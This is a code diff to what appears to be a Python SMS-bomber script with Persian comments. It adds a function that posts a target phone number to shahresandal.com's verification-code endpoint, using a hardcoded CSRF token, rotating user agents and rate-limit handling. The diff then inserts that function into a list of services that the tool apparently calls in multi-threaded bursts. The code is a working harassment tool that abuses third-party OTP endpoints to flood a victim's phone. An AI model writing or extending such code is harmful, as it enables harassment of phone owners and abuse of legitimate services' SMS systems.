@@ -63,6 +63,62 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def ShahreSandal(phone):
+    try:
+        url = "https://shahresandal.com/sendcode"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "X-CSRF-Token": "clk7kQTBkwUusgSDxOYoxlmoCKDkx0DbrlBEnC0n",  # CSRF Token
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://shahresandal.com",
+            "Referer": "https://shahresandal.com/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] ShahreSandal Status: {response.status_code}{a}')
+        print(f'{y}[Debug] ShahreSandal Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(ShahreSandal) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] ShahreSandal Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(ShahreSandal) Code Sent{a}')
+                    return True
+                return False
+        elif response.status_code == 429:
+            print(f'{y}[!] ShahreSandal: Rate Limited (Too Many Requests){a}')
+            return False
+        else:
+            print(f'{r}[-] ShahreSandal HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] ShahreSandal Exception: {e}{a}')
+        return False
+
 
 def SibApp(phone):
     try:
@@ -236,7 +292,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [SibApp, Balad, nillarayeshi]
+services = [SibApp, ShahreSandal, Balad, nillarayeshi]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
